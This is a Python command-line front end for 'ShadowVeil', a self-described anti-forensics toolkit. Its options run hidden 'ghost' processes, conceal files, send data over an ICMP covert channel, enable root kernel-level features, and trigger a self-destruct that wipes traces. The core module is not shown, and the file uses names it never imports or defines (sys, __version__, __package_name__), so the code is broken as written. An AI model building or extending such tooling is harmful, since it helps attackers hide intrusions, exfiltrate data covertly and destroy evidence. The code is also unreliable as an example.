# shadowveil/cli.py

import argparse
from .core import ShadowVeilCore

def launch_cli():
    """Standalone command-line interface"""
    parser = argparse.ArgumentParser(
        description='ShadowVeil - Advanced Anti-Forensics Toolkit'
    )
    parser.add_argument('--mode', choices=['stealth', 'paranoid', 'aggressive'], 
                        default='aggressive', help='Operational mode')
    parser.add_argument('--deep-cover', action='store_true', 
                        help='Enable kernel-level features (requires root)')
    parser.add_argument('--execute', '-x', help='Command to execute stealthily')
    parser.add_argument('--tunnel', '-t', help='File to tunnel in filesystem')
    parser.add_argument('--covert', '-c', help='Data to send via covert channel')
    parser.add_argument('--clean', action='store_true', 
                        help='Activate self-destruct protocol')
    
    args = parser.parse_args()
    
    sv = ShadowVeilCore(
        cloak_mode=args.mode,
        deep_cover=args.deep_cover
    )
    
    if sv.setup():
        print(f"[+] {__package_name__} v{__version__} activated")
        
        if args.execute:
            pid = sv.execute_stealth(args.execute)
            print(f"  └─ Executed ghost process (PID: {pid})")
        
        if args.tunnel:
            result = sv.tunnel_file(args.tunnel)
            print(f"  └─ File tunneled to: {result}")
        
        if args.covert:
            if sv.covert_channel(args.covert.encode(), channel="icmp"):
                print("  └─ Covert channel established")
        
        if args.clean:
            sv.clean_system()
            print("  └─ System sanitized - exiting")
    else:
        print("[-] Initialization failed - aborting")
        sys.exit(1)